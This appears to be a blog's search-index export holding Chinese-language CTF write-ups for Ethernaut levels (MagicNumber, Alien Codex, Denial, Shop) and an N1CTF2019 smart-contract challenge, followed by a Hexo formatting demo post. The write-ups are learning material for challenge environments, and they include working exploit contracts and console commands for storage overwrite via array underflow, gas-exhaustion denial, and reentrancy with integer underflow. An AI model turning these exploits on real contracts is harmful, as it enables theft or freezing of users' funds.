encode_length(len(output), 0xc0) + outputdef encode_length(L,offset): if L &lt; 56: return chr(L + offset) elif L &lt; 256**8: BL = to_binary(L) return chr(len(BL) + offset + 55) + BL else: raise Exception("input too long")def to_binary(x): if x == 0: return '' else: return to_binary(int(x / 256)) + chr(x % 256)print rlp_encode(["d29fcc4b193a576a17af9194d706b17ce5da24e2".decode('hex'),"01".decode('hex')]).encode('hex') 结果是 d694d29fcc4b193a576a17af9194d706b17ce5da24e201 拿到 solidity 计算地址 123456pragma solidity ^0.4.18;contract test&#123; function func() view returns (address)&#123; return address(keccak256(0xd694d29fcc4b193a576a17af9194d706b17ce5da24e201)); &#125;&#125; 可以看到计算的地址和方法一是一样的 MagicNumberRequireTo solve this level, you only need to provide the Ethernaut with a “Solver”, a contract that responds to “whatIsTheMeaningOfLife()” with the right number.Easy right? Well… there’s a catch.The solver’s code needs to be really tiny. Really reaaaaaallly tiny. Like freakin’ really really itty-bitty tiny: 10 opcodes at most.Hint: Perhaps its time to leave the comfort of the Solidity compiler momentarily, and build this one by hand O_o. That’s right: Raw EVM bytecode.Good luck! 题目的意思就是部署一个合约 Solver ，要求在被调用 whatIsTheMeaningOfLife() 函数时返回 42 就可以了，但有一个限制是不能超过 10 个 opcode Source123456789101112131415161718192021222324pragma solidity ^0.4.24;contract MagicNum &#123; address public solver; constructor() public &#123;&#125; function setSolver(address _solver) public &#123; solver = _solver; &#125; /* ____________/\\\_______/\\\\\\\\\_____ __________/\\\\\_____/\\\///////\\\___ ________/\\\/\\\____\///______\//\\\__ ______/\\\/\/\\\______________/\\\/___ ____/\\\/__\/\\\___________/\\\//_____ __/\\\\\\\\\\\\\\\\_____/\\\//________ _\///////////\\\//____/\\\/___________ ___________\/\\\_____/\\\\\\\\\\\\\\\_ ___________\///_____\///////////////__ */&#125; Analyse多说的话 参考 https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2 参考 https://f3real.github.io/Ethernaut_wargame19.html 图片来自于https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2 先看一下 contract creation 期间会发生什么：1、首先，用户或合约将交易发送到以太网网络。此交易包含数据，但没有 to 地址，表明这是一个合约创建，而不是一个 send/call transaction2、其次，EVM 将 Solidity（高级语言）的合约代码编译为 bytecode（底层的机器语言），该 bytecode 直接转换为 opcodes ，在单个调用堆栈中运行 需要注意的是：contract creation 的 bytecode 包含两部分：initialization code 和 runtime code 3、在 contract creation 期间，EVM 仅执行 initialization code 直到到达堆栈中的第一条 STOP 或 RETURN 指令，在此阶段，合约的 constructor() 会被运行，合约便有地址了 在运行 initialization code 后，只有 runtime code 在堆栈上，然后将这些 opcode 拷贝 到 memory 并返回到 EVM 4、最后，EVM 将 runtime code 返回的 opcode 存储在 state storage ，并与新的合约地址相关联，在将来对新合约的调用时，这些 runtime code 将被执行 对于该题 所以为了解决该题，我们需要 initialization opcodes 和 runtime codes initialization opcodes: 由 EVM 运行创建合约并存储将来要用的 runtime codes runtime codes: 包含所需的实际执行逻辑。对于本题来说，这是应该返回的代码的主要部分，应该 return 42 并且 under 10 opcodes 1、先来看 runtime codes : 返回值由 return(p, s) 操作码处理，但是在返回值之前，必须先存储在内存中，使用 mstore(p, v) 将 42 存储在内存中 首先，使用 mstore(p, v) 将 42 存储在内存中，其中 p 是在内存中的存储位置， v 是十六进制值，42 的十六进制是 0x2a 1230x602a ;PUSH1 0x2a v0x6080 ;PUSH1 0x80 p0x52 ;MSTORE 然后，使用 return(p, s) 返回 0x2a ，其中 p 是值 0x2a 存储的位置，s 是值 0x2a 存储所占的大小 0x20 ，占32字节 1230x6020 ;PUSH1 0x20 s0x6080 ;PUSH1 0x80 p0xf3 ;RETURN 所以 runtime codes 应该是 602a60805260206080f3 ，正好 10 opcodes 2、再来看 initialization codes : 首先，initialization codes 需要先将 runtime codes 拷贝到内存，然后再将其返回到 EVM 。将代码从一个地方复制到另一个地方是 codecopy(t, f, s) 操作码。t 是代码的目标位置，f 是 runtime codes 的当前位置，s 是代码的大小，以字节为单位，对于 602a60805260206080f3 就是 10 bytes 12345;copy bytecode to memory0x600a ;PUSH1 0x0a S(runtime code size)0x60?? ;PUSH1 0x?? F(current position of runtime opcodes)0x6000 ;PUSH1 0x00 T(destination memory index 0)0x39 ;CODECOPY 然后，需要将内存中的 runtime codes 返回到 EVM 1234;return code from memory to EVM0x600a ;PUSH1 0x0a S0x6000 ;PUSH1 0x00 P0xf3 ;RETURN initialization codes 总共占了 0x0c 字节，这表示 runtime codes 从索引 0x0c 开始，所以 ?? 的地方是 0x0c 所以，initialization codes 最后的顺序是 600a600c600039600a6000f3 所以，opcodes最后的顺序是 0x600a600c600039600a6000f3602a60805260206080f3 Solution12var bytecode = "0x600a600c600039600a6000f3602a60805260206080f3";web3.eth.sendTransaction(&#123; from: player, data: bytecode &#125;, function(err,res)&#123;console.log(res)&#125;); 得到https://ropsten.etherscan.io/tx/0x2e2a636712b37e27af795073a7be6fca9ddfdf964a2356d98c113463c69359ff，点击查看如下，得到 Contract address 为 0x7baa1861df4eff11ff258e657bff2420be19b564 调用题目合约 setsolver(“0x7baa1861df4eff11ff258e657bff2420be19b564”) 即可 Alien CodexRequire You&#39;ve uncovered an Alien contract. Claim ownership to complete the level. Source12345678910111213141516171819202122232425262728293031pragma solidity ^0.4.24;import 'zeppelin-solidity/contracts/ownership/Ownable.sol';contract AlienCodex is Ownable &#123; bool public contact; bytes32[] public codex; modifier contacted() &#123; assert(contact); _; &#125; function make_contact(bytes32[] _firstContactMessage) public &#123; assert(_firstContactMessage.length &gt; 2**200); contact = true; &#125; function record(bytes32 _content) contacted public &#123; codex.push(_content); &#125; function retract() contacted public &#123; codex.length--; &#125; function revise(uint i, bytes32 _content) contacted public &#123; codex[i] = _content; &#125;&#125; Analyse 合约开头 import 了 Ownable.sol 合约，同时也引入了一个 owner 变量 12await web3.eth.getStorageAt(instance, 0, function(x, y) &#123;console.info(y)&#125;);// 0x00000000000000000000000073048cec9010e92c298b016966bde1cc47299df5 其中 owner = 0x73048cec9010e92c298b016966bde1cc47299df5 ，contract = 0x0，这是由于 EVM 存储优化的关系，可以参考 https://solidity.readthedocs.io/en/v0.4.25/miscellaneous.html#layout-of-state-variables-in-storage 并且数组 codex 的 slot 为 1 ，同时这也是存储数组 length 的地方，而 codex 的实际内容存储在 keccak256(bytes32(1)) 开始的位置 Keccak256 是紧密打包的，意思是说参数不会补位，多个参数也会直接连接在一起，所以要用 keccak256(bytes32(1)) 参考 Solidity中各种变量的存储方式 这样我们就知道了 codex 实际的存储的 slot ，可以将动态数组内变量的存储位计算方法概括为: array[array_slot_index] == SLOAD(keccak256(slot(array)) + slot_index). 因为总共有 2^256 个 slot ，要修改 slot 0 ，假设 codex 实际所在 slot x ，(对于本题来说，数组的 slot是 1 , x=keccak256(bytes32(1))) ，那么当我们修改 codex[y],(y=2^256-x+0) 时就能修改 slot 0 ，从而修改 owner 我们要修改 codex[y] ，那就要满足 y &lt; codex.length ，而这个时候 codex.length =0 ，但是我们可以通过 retract() 使 length 下溢，然后就可以操纵 codex[y] 了 123await web3.eth.getStorageAt(instance, 1, function(x, y) &#123;console.info(y)&#125;);// codex.length// 0x0000000000000000000000000000000000000000000000000000000000000000 但是无论调用题目合约哪个函数，都要满足 modifier contacted() ，所以要先使 contact=true ，也就是要先解决 make_contact 这个问题 Solution1、先看 make_contact 函数，我们需要传人一个 length&gt;2^200 的数组，OPCODE 中数组长度是存储在某个 slot 上的，并且没有对数组长度和数组内的数据做校验，所以可以构造一个存储位上长度很大，但实际上并没有数据的数组，打包成 data 发送123456789101112sig = web3.sha3("make_contact(bytes32[])").slice(0,10) // 函数id// "0x1d3d4c0b"data1 = "0000000000000000000000000000000000000000000000000000000000000020" //偏移，指的是除了函数id，数组内容开始的位置，在这里我们设置的是offset=32// 除去函数选择器，数组长度的存储从第 0x20 位开始data2 = "1000000000000000000000000000000000000000000000000000000000000001" //length&gt;2^200// 数组的长度await contract.contact()// falsecontract.sendTransaction(&#123;data: sig + data1 + data2&#125;);// 发送交易await contract.contact()// true 2、计算 codex 位置为 slot 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 所以 y = 2^256 - 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 + 0 即 y = 35707666377435648211887908874984608119992236509074197713628505308453184860938 123456789pragma solidity ^0.4.24;contract codex &#123; function cal() view returns(bytes32)&#123; return keccak256((bytes32(1))); &#125; &#125; 3、可以看到 y = 35707666377435648211887908874984608119992236509074197713628505308453184860938 很大，而 codex.length=0(见Analyse) 很小，我们通过 retract() 使得 codex 数组 length 下溢，使其满足 y &lt; codex.length12345678web3.eth.getStorageAt(instance, 1, function(x, y) &#123;console.info(y)&#125;); // codex.length// 0x0000000000000000000000000000000000000000000000000000000000000000contract.retract()// codex.length--web3.eth.getStorageAt(instance, 1, function(x, y) &#123;console.info(y)&#125;); // codex.length// 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff 4、由2和3已经计算出 codex[35707666377435648211887908874984608119992236509074197713628505308453184860938] 对应的存储位就是 slot 0 ，在 Analyse 中提到 slot 0 中同时存储了 contact 和 owner ，我们只需将 owner 换成 player 地址即可123456789await contract.owner()// "0x73048cec9010e92c298b016966bde1cc47299df5"player// "0x88d3052d12527f1fbe3a6e1444ea72c4ddb396c2"contract.revise('35707666377435648211887908874984608119992236509074197713628505308453184860938','0x00000000000000000000000088d3052d12527f1fbe3a6e1444ea72c4ddb396c2')// 调用 revise()await contract.owner()// "0x88d3052d12527f1fbe3a6e1444ea72c4ddb396c2"// Submit instance DenialRequire This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner. If you can deny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds) you will win this level. 结合代码看了一下，要求就是在调用 withdraw 时，禁止 owner 转走账户的 1% 的余额 Source123456789101112131415161718192021222324252627282930313233343536pragma solidity ^0.4.24;import 'openzeppelin-solidity/contracts/math/SafeMath.sol';contract Denial &#123; using SafeMath for uint256; address public partner; // withdrawal partner - pay the gas, split the withdraw address public constant owner = 0xA9E; uint timeLastWithdrawn; mapping(address =&gt; uint) withdrawPartnerBalances; // keep track of partners balances function setWithdrawPartner(address _partner) public &#123; partner = _partner; &#125; // withdraw 1% to recipient and 1% to owner function withdraw() public &#123; uint amountToSend = address(this).balance.div(100); // perform a call without checking return // The recipient can revert, the owner will still get their share partner.call.value(amountToSend)(); owner.transfer(amountToSend); // keep track of last withdrawal time timeLastWithdrawn = now; withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend); &#125; // allow deposit of funds function() payable &#123;&#125; // convenience function function contractBalance() view returns (uint) &#123; return address(this).balance; &#125;&#125; Analyse 可以使 transfer 失败，也就是把 gas 耗光 使用 assert 失败的话，将会 spend all gas ，这样的话 owner.transfer(amountToSend) 将执行失败 这里还有一个很明显的重入漏洞 partner.call.value(amountToSend)() ，利用重入漏洞把 gas 消耗完，应该也可以达到目的（自行尝试） Solution1234567891011121314151617181920212223242526272829303132333435363738394041424344454647pragma solidity ^0.4.24;contract Denial &#123; address public partner; // withdrawal partner - pay the gas, split the withdraw address public constant owner = 0xA9E; uint timeLastWithdrawn; mapping(address =&gt; uint) withdrawPartnerBalances; // keep track of partners balances function setWithdrawPartner(address _partner) public &#123; partner = _partner; &#125; // withdraw 1% to recipient and 1% to owner function withdraw() public &#123; uint amountToSend = address(this).balance/100; // perform a call without checking return // The recipient can revert, the owner will still get their share partner.call.value(amountToSend)(); owner.transfer(amountToSend); // keep track of last withdrawal time timeLastWithdrawn = now; withdrawPartnerBalances[partner] += amountToSend; &#125; // allow deposit of funds function() payable &#123;&#125; // convenience function function contractBalance() view returns (uint) &#123; return address(this).balance; &#125;&#125;contract hack &#123; address instance_address = 0xe6cdb72d9fec660b78eb2390ffa67ab61b766e51; Denial target = Denial(instance_address); function hack1() public &#123; target.setWithdrawPartner(address(this)); target.withdraw(); &#125; function() payable &#123; assert(0==1); &#125;&#125; 直接调用 hack1() 即可 ShopRequire 题目意思是修改 price 小于 100 （不过这个题目好像下线了23333） Source12345678910111213141516171819pragma solidity 0.4.24;interface Buyer &#123; function price() external view returns (uint);&#125;contract Shop &#123; uint public price = 100; bool public isSold; function buy() public &#123; Buyer _buyer = Buyer(msg.sender); if (_buyer.price.gas(3000)() &gt;= price &amp;&amp; !isSold) &#123; isSold = true; price = _buyer.price.gas(3000)(); &#125; &#125;&#125; Analyse 本来想的是利用 storage 修改，可是修改变量需要 5000 gas，但是我们只有 3000 所以需要另想办法，发现 isSold 是 public 属性，所以可以利用 isSold ，根据 isSold 进行判断，两次调用 _buyer.price.gas(3000)() 第一次返回大于等于 100 ，第二次返回小于 100 即可 Solution1234567891011121314151617181920212223242526272829303132pragma solidity 0.4.24;interface Buyer &#123; function price() external view returns (uint);&#125;contract Shop &#123; uint public price = 100; bool public isSold; function buy() public &#123; Buyer _buyer = Buyer(msg.sender); if (_buyer.price.gas(3000)() &gt;= price &amp;&amp; !isSold) &#123; isSold = true; price = _buyer.price.gas(3000)(); &#125; &#125;&#125;contract Buyer &#123; address instance_address = instance_address_here; Shop target = Shop(instance_address); function price() external view returns (uint)&#123; return target.isSold() == true ? 99 : 100; &#125; function attack() public &#123; target.buy(); &#125;&#125; 直接调用 attack() 即可 Referencehttp://mitah.cn/index.php/archives/14/https://f3real.github.io/Ethernaut_wargame2022.html#lvl-21-denialhttps://www.codercto.com/a/38161.htmlhttps://www.secpulse.com/archives/73682.htmlhttps://www.anquanke.com/post/id/148341#h2-12https://xz.aliyun.com/t/2856#toc-4https://blog.riskivy.com/智能合约ctf：ethernaut-writeup-part-4/https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Solidity</tag>
        <tag>Smart Contract</tag>
        <tag>Ethernaut</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[N1CTF2019 h4ck]]></title>
    <url>%2F2019%2Fh4ck%2F</url>
    <content type="text"><![CDATA[前言前段时间参加了一下N1CTF2019（作为小白参加），很幸运做出一道Smart Contract的题目，在此记录一下，合约地址如下：https://kovan.etherscan.io/address/0xe2d6d8808087d2e30eadf0acb67708148dbee0c0 Contract Code123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142/** *Submitted for verification at Etherscan.io on 2019-09-07*//** *Submitted for verification at Etherscan.io on 2019-05-31*/pragma solidity ^0.4.25;contract owned &#123; address public owner; constructor () public &#123; owner = msg.sender; &#125; modifier onlyOwner &#123; require(msg.sender == owner); _; &#125; function transferOwnership(address newOwner) public onlyOwner &#123; owner = newOwner; &#125;&#125;contract challenge is owned&#123; string public name; string public symbol; uint8 public decimals = 18; uint256 public totalSupply; mapping (address =&gt; uint256) public balanceOf; mapping (address =&gt; uint256) public sellTimes; mapping (address =&gt; mapping (address =&gt; uint256)) public allowance; mapping (address =&gt; bool) public winner; event Transfer(address _from, address _to, uint256 _value); event Burn(address _from, uint256 _value); event Win(address _address,bool _win); constructor ( uint256 initialSupply, string tokenName, string tokenSymbol ) public &#123; totalSupply = initialSupply * 10 ** uint256(decimals); balanceOf[msg.sender] = totalSupply; name = tokenName; symbol = tokenSymbol; &#125; function _transfer(address _from, address _to, uint _value) internal &#123; require(_to != address(0x0)); require(_value &gt; 0); uint256 oldFromBalance = balanceOf[_from]; uint256 oldToBalance = balanceOf[_to]; uint256 newFromBalance = balanceOf[_from] - _value; uint256 newToBalance = balanceOf[_to] + _value; require(oldFromBalance &gt;= _value); require(newToBalance &gt; oldToBalance); balanceOf[_from] = newFromBalance; balanceOf[_to] = newToBalance; assert((oldFromBalance + oldToBalance) == (newFromBalance + newToBalance)); emit Transfer(_from, _to, _value); &#125; function transfer(address _to, uint256 _value) public returns (bool success) &#123; _transfer(msg.sender, _to, _value); return true; &#125; function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) &#123; require(_value &lt;= allowance[_from][msg.sender]); allowance[_from][msg.sender] -= _value; _transfer(_from, _to, _value); return true; &#125; function approve(address _spender, uint256 _value) public returns (bool success) &#123; allowance[msg.sender][_spender] = _value; return true; &#125; function burn(uint256 _value) public returns (bool success) &#123; require(balanceOf[msg.sender] &gt;= _value); balanceOf[msg.sender] -= _value; totalSupply -= _value; emit Burn(msg.sender, _value); return true; &#125; function balanceOf(address _address) public view returns (uint256 balance) &#123; return balanceOf[_address]; &#125; function buy() payable public returns (bool success)&#123; require(balanceOf[msg.sender]==0); require(msg.value == 1 wei); _transfer(address(this), msg.sender, 1); sellTimes[msg.sender] = 1; return true; &#125; function sell(uint256 _amount) public returns (bool success)&#123; require(_amount &gt;= 100); require(sellTimes[msg.sender] &gt; 0); require(balanceOf[msg.sender] &gt;= _amount); require(address(this).balance &gt;= _amount); msg.sender.call.value(_amount)(); _transfer(msg.sender, address(this), _amount); sellTimes[msg.sender] -= 1; return true; &#125; function winnerSubmit() public returns (bool success)&#123; require(winner[msg.sender] == false); require(sellTimes[msg.sender] &gt; 100); winner[msg.sender] = true; emit Win(msg.sender,true); return true; &#125; function kill(address _address) public onlyOwner &#123; selfdestruct(_address); &#125; function eth_balance() public view returns (uint256 ethBalance)&#123; return address(this).balance; &#125; &#125; 分析 题目的要求是execute the winnerSubmit function 1234567function winnerSubmit() public returns (bool success)&#123; require(winner[msg.sender] == false); require(sellTimes[msg.sender] &gt; 100); winner[msg.sender] = true; emit Win(msg.sender,true); return true;&#125; 这里有两个require，其中第一个require很容易满足，创建winner的时候默认全为false，所以只要满足第二个require即可 require(winner[msg.sender] == false); require(sellTimes[msg.sender] &gt; 100); 阅读合约代码，发现sell函数，这里的msg.sender.call.value(_amount)()存在Reentrancy漏洞,同时可以使得sellTimes[msg.sender] -= 1,如果能产生下溢就行了，所以需要找一下初始化sellTimes[msg.sender]的地方，但是这里有4个require： 第一个require很容易满足 第二个require可以看下面的buy函数分析 第三个require可以使用薅羊毛攻击方法，使得balanceOf[msg.sender]达到指定数额 第四个require自动满足，address(this).balance给的很大12345678910function sell(uint256 _amount) public returns (bool success)&#123; require(_amount &gt;= 100); require(sellTimes[msg.sender] &gt; 0); require(balanceOf[msg.sender] &gt;= _amount); require(address(this).balance &gt;= _amount); msg.sender.call.value(_amount)(); _transfer(msg.sender, address(this), _amount); sellTimes[msg.sender] -= 1; return true;&#125; 找到了buy函数，可以使得sellTimes[msg.sender] = 1，这里有两个require，第一个很容易满足，默认就是0，所以只要msg.value == 1 wei即可，这样的话buy函数就可以改变sellTimes[msg.sender]为1了 1234567function buy() payable public returns (bool success)&#123; require(balanceOf[msg.sender]==0); require(msg.value == 1 wei); _transfer(address(this), msg.sender, 1); sellTimes[msg.sender] = 1; return true;&#125; 这样的话，如果利用buy函数先使得sellTimes[msg.sender]=1，然后调用sell函数利用Reentrancy漏洞重入攻击两次的话，sellTimes[msg.sender]是uint256类型，连续两次减1可以下溢，远远大于100，便可满足winnerSubmit中的第二个require，攻击成功 部署攻击合约攻击合约代码这里部署了两个合约（不要在意命名了23333），hacker是攻击合约，hacker1是辅助合约，用来完成薅羊毛转账用到的， 注意在部署hacker的同时转账1 wei，目的是调用后面的buy函数 部署hacker1的同时转账200 wei，目的是完成后面薅羊毛转账，若amount=100 wei，则可以Reentrancy攻击两次，完成攻击1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253contract hacker &#123; address instance_address = 0xe2d6d8808087d2e30eadf0acb67708148dbee0c0; challenge target = challenge(instance_address); function hacker() payable &#123;&#125; function hack1()&#123; target.buy.value(1)(); &#125; function hack4()&#123; target.sell(uint(100)); &#125; function get() public view returns (uint256 balance) &#123; return address(this).balance; &#125; function hack5()&#123; target.winnerSubmit(); &#125; function() public payable &#123; target.sell(uint(100)); &#125; &#125;contract hacker1 &#123; address instance_address = 0xe2d6d8808087d2e30eadf0acb67708148dbee0c0; challenge target = challenge(instance_address); function hacker1() payable &#123;&#125; function hack1()&#123; target.buy.value(1)(); &#125; function hack2()&#123; target.transfer(address(0x5ebec5286e74362613a5e6e8e3bb90df408fe2a7), 1); &#125; function hack3()&#123; for(uint i = 0; i&lt;100; i++)&#123; hack1(); hack2(); &#125; &#125; function get() public view returns (uint256 balance) &#123; return address(this).balance; &#125;&#125; 调用步骤攻击合约地址0x48e3c62a006758d26b3ded0f4e28317fe0ea9dc8薅羊毛辅助合约地址0x334e9e1c289be32000182e549fbadf27589b436e 调用hacker的hack1函数，使得sellTimes[address hacker]=1，balanceOf[address hacker]=1 wei 调用hacker1的hack3函数两次，使得balanceOf[address hacker]+200=201 调用hacker的hack4函数两次，每次amount=100，这样便使得sellTimes[address hacker]完成下溢，可以看到sellTimes[address hacker]已经下溢到一个很大的数 最后调用hacker的hack5调用winnerSubmit完成攻击(主办方服务已关闭23333所以没法看到flag，只有当时被搅屎棍搞过的一张截图了，一直拿不到flag，最后发现flag只有在请求的那一瞬间会出现而且仅出现一次，请原谅我不会利用web3自动化模拟攻击，不过最后还是解决了，写了个脚本，一直请求就可以，成功拿到了flag，脚本如下)123456import requestsurl="http://47.244.41.61/challenge?address=0x48e3c62a006758d26b3ded0f4e28317fe0ea9dc8"while True: print requests.get(url).content.split("alert")[1].split("script")[0]]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>Solidity</tag>
        <tag>Smart Contract</tag>
        <tag>N1CTF2019</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Start My Blog Trip]]></title>
    <url>%2F2019%2FHello-World%2F</url>
    <content type="text"><![CDATA[前言介绍Grammar及其Style 名言Life is a generic method like [ public Life doSomething(T t){} ],T is the part of life that requires you to play in a period of time,and the method will return a life you expect if you to be T. —— 沃·兹基硕德 1234&#123;% centerquote %&#125;Life is a generic method like [ public &lt;T&gt; Life doSomething(T t)&#123;&#125; ],T is the part of life that requires you to play in a period of time,and the method will return a life you expect if you to be T. —— ***沃·兹基硕德***&#123;% endcenterquote %&#125; 下载图形边框 Download Now1234&lt;a id=&quot;download&quot; href=&quot;https://git-scm.com/download/win&quot;&gt; &lt;i class=&quot;fa fa-download&quot;&gt;&lt;/i&gt; &lt;span&gt; Download Now&lt;/span&gt;&lt;/a&gt; 在文档中增加图标 支持MarkdownHexo 支持 GitHub Flavored Markdown 的所有功能, 甚至可以整合 Octopress 的大多数插件. 一键部署只需一条指令即可部署到Github Pages, 或其他网站 丰富的插件Hexo 拥有强大的插件系统, 安装插件可以让 Hexo 支持 Jade, CoffeeScript. 123456- &lt;i class=&quot;fa fa-pencil&quot;&gt;&lt;/i&gt;支持Markdown&lt;i&gt;Hexo 支持 GitHub Flavored Markdown 的所有功能, 甚至可以整合 Octopress 的大多数插件. &lt;/i&gt;- &lt;i class=&quot;fa fa-cloud-upload&quot;&gt;&lt;/i&gt;一键部署&lt;i&gt;只需一条指令即可部署到Github Pages, 或其他网站&lt;/i&gt;- &lt;i class=&quot;fa fa-cog&quot;&gt;&lt;/i&gt;丰富的插件&lt;i&gt;Hexo 拥有强大的插件系统, 安装插件可以让 Hexo 支持 Jade, CoffeeScript. &lt;/i&gt; &lt;i class=&quot;fa fa-github&quot;&gt;&lt;/i&gt;1&lt;i class=&quot;fa fa-github&quot;&gt;&lt;/i&gt;`&lt;i class=&quot;fa fa-github&quot;&gt;&lt;/i&gt;` &lt;i class=&quot;fa fa-github fa-lg&quot;&gt;&lt;/i&gt;1&lt;i class=&quot;fa fa-github fa-lg&quot;&gt;&lt;/i&gt;`&lt;i class=&quot;fa fa-github fa-lg&quot;&gt;&lt;/i&gt;` &lt;i class=&quot;fa fa-github fa-2x&quot;&gt;&lt;/i&gt;1&lt;i class=&quot;fa fa-github fa-2x&quot;&gt;&lt;/i&gt;`&lt;i class=&quot;fa fa-github fa-2x&quot;&gt;&lt;/i&gt;` 文字增加背景色块站点配置文件 , 主题配置文件1234&lt;span id=&quot;inline-blue&quot;&gt;站点配置文件&lt;/span&gt;,&lt;span id=&quot;inline-purple&quot;&gt;主题配置文件&lt;/span&gt;&lt;span id=&quot;inline-green&quot;&gt;站点配置文件&lt;/span&gt;,&lt;span id=&quot;inline-yellow&quot;&gt;主题配置文件&lt;/span&gt; 引用边框变色我要变色我要变色我要变色我要变色 123456789101112131415&lt;p id=&quot;div-border-top-red&quot;&gt;我要变色&lt;/p&gt;&lt;p id=&quot;div-border-top-yellow&quot;&gt;我要变色&lt;/p&gt;&lt;p id=&quot;div-border-top-green&quot;&gt;我要变色&lt;/p&gt;&lt;p id=&quot;div-border-top-blue&quot;&gt;我要变色&lt;/p&gt;&lt;p id=&quot;div-border-top-purple&quot;&gt;我要变色&lt;/p&gt;&lt;p id=&quot;div-border-left-red&quot;&gt;我要变色&lt;/p&gt;&lt;p id=&quot;div-border-left-yellow&quot;&gt;我要变色&lt;/p&gt;&lt;p id=&quot;div-border-left-green&quot;&gt;我要变色&lt;/p&gt;&lt;p id=&quot;div-border-left-blue&quot;&gt;我要变色&lt;/p&gt;&lt;p id=&quot;div-border-left-purple&quot;&gt;我要变色&lt;/p&gt;&lt;p id=&quot;div-border-right-red&quot;&gt;我要变色&lt;/p&gt;&lt;p id=&quot;div-border-right-yellow&quot;&gt;我要变色&lt;/p&gt;&lt;p id=&quot;div-border-right-green&quot;&gt;我要变色&lt;/p&gt;&lt;p id=&quot;div-border-right-blue&quot;&gt;我要变色&lt;/p&gt;&lt;p id=&quot;div-border-right-purple&quot;&gt;我要变色&lt;/p&gt; 英文圈起来的样式圈圈圆圆1`圈圈圆圆` 插入代码12345678910111213var disqus = &#123; load : function disqus()&#123; if(typeof DISQUS !== 'object') &#123; (function () &#123; var s = document.createElement('script'); s.async = true; s.type = 'text/javascript'; s.src = '//' + disqus_shortname + '.disqus.com/embed.js'; (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s); &#125;()); $('#load-disqus').html("评论加载中, 请确保你有梯子, 若评论长时间未加载则你可能翻墙失败...").fadeOut(9000); //加载后移除按钮 &#125; &#125;&#125; 1使用```（结尾还有一个）javascript 图片1![](https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/Hello-World/header_background.jpg) 代码高亮Hello World示例这是链接1234 public static void main(String[] args) &#123;+ System.out.println("Hello World!");- System.out.println("Hello World!"); &#125; 正确姿势, 代码片段开头:1[language] [title] [url] [link-text] [language] 是代码语言的名称, 用来设置代码块颜色高亮, 非必须； [title] 是顶部左边的说明, 非必须； [url] 是顶部右边的超链接地址, 非必须； [link text] 如它的字面意思, 超链接的名称, 非必须. 这 4 项应该是根据空格来分隔, 而不是[], 故请不要加[]. 除非如果你想写后面两个, 但不想写前面两个, 那么就必须加[]了, 要这样写: [] [] [url] [link text]. 链接https://hitcxy.com1[https://hitcxy.com](https://hitcxy.com) 无序列表 没有顺序1 没有顺序2 没有顺序3123- 没有顺序1- 没有顺序2- 没有顺序3 链接+列表 百度提交入口 Google提交入口 360提交入口123* ***[百度提交入口](http://zhanzhang.baidu.com/linksubmit/url)**** ***[Google提交入口](https://www.google.com/webmasters/tools/home?hl=zh-CN)**** ***[360提交入口](http://info.so.360.cn/site_submit.html)*** 斜体你看我斜不斜1*你看我斜不斜* 强调你看我重不重要1**你看我重不重要** 参考 参考http://codepub.cn/2015/04/06/Github-Pages-personal-blog-from-Octopress-to-Hexo/http://codepub.cn/2016/03/20/Hexo-blog-theme-switching-from-Jacman-to-NexT-Mist/123&gt; **参考**&gt; ***[http://codepub.cn/2015/04/06/Github-Pages-personal-blog-from-Octopress-to-Hexo/](http://codepub.cn/2015/04/06/Github-Pages-personal-blog-from-Octopress-to-Hexo/)***&gt; ***[http://codepub.cn/2016/03/20/Hexo-blog-theme-switching-from-Jacman-to-NexT-Mist/](http://codepub.cn/2016/03/20/Hexo-blog-theme-switching-from-Jacman-to-NexT-Mist/)*** 好看的符号「啦啦啦」就像这样↓]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Hello</tag>
        <tag>Grammar</tag>
      </tags>
  </entry>
</search>
